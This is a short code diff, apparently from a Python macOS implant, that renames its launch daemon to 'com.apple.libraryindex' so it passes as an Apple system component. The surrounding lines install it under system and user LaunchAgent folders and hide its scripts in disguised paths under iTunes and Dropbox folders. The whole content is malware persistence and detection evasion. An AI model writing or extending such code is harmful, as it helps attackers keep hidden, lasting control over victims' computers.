@@ -595,7 +595,7 @@ STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                 '<plist version="1.0">' + '\n'
                 '<dict>' + '\n'
                 '\t' + '<key>Label</key>' + '\n'
-                '\t' + '<string>pythondaemon</string>' + '\n'
+                '\t' + '<string>com.apple.libraryindex</string>' + '\n'
                 '\t' + '<key>ProgramArguments</key>' + '\n'
                 '\t' + '<array>' + '\n'
                 '\t\t' + '<string>{python_path}</string>' + '\n'
@@ -617,7 +617,7 @@ STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
 STARTUP_LOCS = ['/System/Library/LaunchAgents',
                 '/System/Library/LaunchDaemons',
                 '~/Library/LaunchAgents']
-DAEMON_NAME = 'library_launcher.plist'
+DAEMON_NAME = 'com.apple.libraryindex.plist'
 
 SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']
 
